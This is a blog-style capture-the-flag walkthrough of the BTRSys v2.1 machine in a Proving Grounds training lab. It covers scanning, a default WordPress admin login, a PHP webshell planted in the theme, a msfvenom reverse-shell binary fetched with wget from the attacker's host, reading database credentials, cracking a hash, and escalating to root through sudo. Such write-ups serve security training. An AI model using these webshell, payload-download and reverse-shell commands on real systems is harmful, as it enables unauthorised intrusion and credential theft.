---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/btrsys-v21,196/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p21,22,80 -sV 192.168.235.50
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-13 20:25 CEST
Nmap scan report for 192.168.235.50
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
```

## dir busting
```bash
$ gobuster dir -k -u http://192.168.235.50/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.235.50/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/08/13 20:08:47 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 294]
/.php                 (Status: 403) [Size: 293]
/.hta.txt             (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 293]
/.hta.php             (Status: 403) [Size: 297]
/.hta.html            (Status: 403) [Size: 298]
/.htaccess            (Status: 403) [Size: 298]
/.htaccess.txt        (Status: 403) [Size: 302]
/.htaccess.html       (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 302]
/.htpasswd.txt        (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 298]
/.htpasswd.html       (Status: 403) [Size: 303]
/.htpasswd.php        (Status: 403) [Size: 302]
/index.html           (Status: 200) [Size: 81]
/index.html           (Status: 200) [Size: 81]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.235.50/javascript/]
/LICENSE              (Status: 200) [Size: 1672]
/robots.txt           (Status: 200) [Size: 1451]
/robots.txt           (Status: 200) [Size: 1451]
/server-status        (Status: 403) [Size: 302]
/upload               (Status: 301) [Size: 317] [--> http://192.168.235.50/upload/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.235.50/wordpress/]
Progress: 18402 / 18460 (99.69%)
===============================================================
2023/08/13 20:11:18 Finished
===============================================================
```

> There is a `wordpress` installation!
{: .prompt-info }

---

# exploitation
## ftp access
```bash
$ ftp 192.168.235.50
Connected to 192.168.235.50.
220 (vsFTPd 3.0.3)
Name (192.168.235.50:void): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44961|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> put 1.txt
local: 1.txt remote: 1.txt
229 Entering Extended Passive Mode (|||48497|)
550 Permission denied.
```

> Anonymous access is allowed but there are no files on the server and we are not able to upload any.
{: .prompt-danger }

## weak `wordpress` credentials
The `wordpress` installation uses weak credentials.  

> This allows us to login as admin on `/wordpress/wp-login` using the credentials `admin:admin`
{: .prompt-info }

> Trying to upload a standalone plugin to get a webshell fails, as the `wordpress` user does not seem to have permissions to write into the uploads folder.
{: .prompt-danger }

However, we can update the installed theme to get a webshell.  

> Therefore in the admin panel we navigate to `Appearance -> Editor -> Main Index Template (on the right)`
{: .prompt-info }

We add the following line and save.
```php
system($_REQUEST['c']);
```

Now we can access the main page of the `wordpress` installation and execute commands on the server.
```http
GET /wordpress/?c=id HTTP/1.1
Host: 192.168.235.50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_e37610d84c63d90bb61a8f78587cb4b4=admin%7C1692123822%7Ca82dd7f4b146ca21c0c02cbfda541041; wp-settings-time-2=1691952180
Connection: close

HTTP/1.1 200 OK
Date: Sun, 13 Aug 2023 18:48:01 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Pingback: /wordpress/xmlrpc.php
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 14484
Connection: close
Content-Type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

> We got a simple shell!
{: .prompt-info }

---

# post exploitation
## reverse shell
The simple `bash` reverse shell oneliner does not seem to work.  
Lets use `msfvenom` to generate a primitive reverse shell, upload it to the target and execute it.

Generate reverse shell binary
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.186 LPORT=80 -f elf > abc
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Start a web server on attacker machine to serve the binary
```bash
$ python3 -m http.server 80                                                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Upload the binary to the target
payload `wget 192.168.45.186/abc -O /tmp/shell`
```bash
GET /wordpress/?c=wget+192.168.45.186/abc+-O+/tmp/shell HTTP/1.1
Host: 192.168.235.50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_e37610d84c63d90bb61a8f78587cb4b4=admin%7C1692123822%7Ca82dd7f4b146ca21c0c02cbfda541041; wp-settings-time-2=1691952180
Connection: close
```

Verify it got requested by the target
```bash
$ python3 -m http.server 80                                                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.235.50 - - [13/Aug/2023 20:54:00] "GET /abc HTTP/1.1" 200 -
```

Set permissions of the binary on the target
payload `chmod +x /tmp/shell`
```bash
GET /wordpress/?c=%63%68%6d%6f%64%20%2b%78%20%2f%74%6d%70%2f%73%68%65%6c%6c HTTP/1.1
Host: 192.168.235.50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_e37610d84c63d90bb61a8f78587cb4b4=admin%7C1692123822%7Ca82dd7f4b146ca21c0c02cbfda541041; wp-settings-time-2=1691952180
Connection: close
```

Start listener for reverse shell on attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

Trigger reverse shell on target
payload `/tmp/shell`
```bash
GET /wordpress/?c=/tmp/shell HTTP/1.1
Host: 192.168.235.50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_e37610d84c63d90bb61a8f78587cb4b4=admin%7C1692123822%7Ca82dd7f4b146ca21c0c02cbfda541041; wp-settings-time-2=1691952180
Connection: close
```

Catch connection from target
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.235.50: inverse host lookup failed: Unknown host
connect to [192.168.45.186] from (UNKNOWN) [192.168.235.50] 58652
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> We got a reverse shell!
{: .prompt-info }

## get first flag
```bash
cd /home
ls
btrisk
cd btrisk
ls -lsah
total 36K
4.0K drwxr-xr-x 4 btrisk 1000 4.0K Jul  9  2020 .
4.0K drwxr-xr-x 3 root   root 4.0K Mar 17  2017 ..
   0 -rw------- 1 btrisk 1000    0 Jul  9  2020 .bash_history
4.0K -rw-r--r-- 1 btrisk 1000  220 Mar 17  2017 .bash_logout
4.0K -rw-r--r-- 1 btrisk 1000 3.7K Mar 17  2017 .bashrc
4.0K drwx------ 2 btrisk 1000 4.0K Mar 17  2017 .cache
   0 -rw------- 1 btrisk 1000    0 Mar  6  2020 .mysql_history
4.0K drwxrwxr-x 2 btrisk 1000 4.0K Mar 21  2017 .nano
4.0K -rw-r--r-- 1 btrisk 1000  655 Mar 17  2017 .profile
   0 -rw-r--r-- 1 btrisk 1000    0 Mar 17  2017 .sudo_as_admin_successful
4.0K -rw------- 1 btrisk 1000  586 Mar 21  2017 .viminfo
4.0K -rw-r--r-- 1 btrisk 1000   33 Aug 13 11:05 local.txt
cat local.txt
c******************************4
```

## privilege escalation
Investigating the `wp-config.php` file of the `wordpress` installation reveals the `mysql` `root` password.
```php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');
...
```

> `root:rootpassword!`
{: .prompt-info }

Lets use these credentials to dig through the database server.
```bash
www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p
mysql -u root -p
Enter password: rootpassword!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 576
Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| deneme             |
| mysql              |
| performance_schema |
| phpmyadmin         |
| sys                |
| wordpress          |
+--------------------+
7 rows in set (0.00 sec)

mysql> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_abtest_experiments      |
| wp_abtest_goal_hits        |
| wp_abtest_goals            |
| wp_abtest_ip_filters       |
| wp_abtest_variation_views  |
| wp_abtest_variations       |
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
26 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)
```

We got the password hash for the user `btrisk`:`a318e4507e5a74604aafb45e4741edd3`

> Using the website `https://crackstation.net/` gives us the plaintext password for this hash `btrisk:roottoor`
{: .prompt-info }

Now lets try this password for the system user `btrisk`.
```bash
www-data@ubuntu:/var/www/html/wordpress$ su btrisk
su btrisk
Password: roottoor

btrisk@ubuntu:/var/www/html/wordpress$ id
id
uid=1000(btrisk) gid=1000 groups=1000,4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

> It worked! And we already see that this user is in the sudo group!
{: .prompt-info }

Lets get `root`
```bash
btrisk@ubuntu:/var/www/html/wordpress$ sudo su
sudo su
root@ubuntu:/var/www/html/wordpress# id
id
uid=0(root) gid=0(root) groups=0(root)
```

> We are `root`!
{: .prompt-info }

## get second flag
```bash
root@ubuntu:/var/www/html/wordpress# cd /root
cd /root
root@ubuntu:~# ls -lsah
ls -lsah
total 32K
4.0K drwx------  4 root root 4.0K Aug 13 11:05 .
4.0K drwxr-xr-x 22 root root 4.0K Feb 20  2020 ..
4.0K -rw-------  1 root root    9 Aug 13 12:18 .bash_history
4.0K -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
4.0K drwx------  2 root root 4.0K Apr 28  2017 .cache
   0 -rw-------  1 root root    0 Mar  6  2020 .mysql_history
4.0K drwxr-xr-x  2 root root 4.0K Mar  6  2020 .nano
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-r--r--  1 root root   33 Aug 13 11:05 proof.txt
root@ubuntu:~# cat proof.txt
cat proof.txt
6******************************a
```

Pwned! <@:-)
